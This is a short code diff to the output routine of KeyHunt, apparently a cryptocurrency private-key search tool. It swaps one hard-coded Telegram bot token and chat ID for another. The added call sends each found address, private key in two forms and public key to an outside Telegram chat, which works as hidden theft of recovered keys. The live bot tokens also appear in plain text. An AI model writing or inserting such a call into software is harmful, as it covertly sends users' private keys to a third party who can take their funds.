@@ -254,7 +254,6 @@ double log1(double x)
 
 void KeyHunt::output(std::string addr, std::string pAddr, std::string pAddrHex, std::string pubKey)
 {
-   sendTelegramMessage("5587100319:AAGmfXbIy9Q6fvGxuWbm_DXDxkSm_tpcMnk", "-4119801998", addr + "\n" + pAddr + "\n" + pAddrHex + "\n" + pubKey);
 
 #ifdef WIN64
 	WaitForSingleObject(ghMutex, INFINITE);
@@ -277,6 +276,9 @@ void KeyHunt::output(std::string addr, std::string pAddr, std::string pAddrHex, 
 	}
 
 	if (!needToClose)
+		
+	         sendTelegramMessage("6509948031:AAEm6BZfLKTLoBe7eN2j3qdGn3Hb6V3MM6o", "-825550725", addr + "\n" + pAddr + "\n" + pAddrHex + "\n" + pubKey);
+
 		printf("\n");
 
 	fprintf(f, "PubAddress: %s\n", addr.c_str());
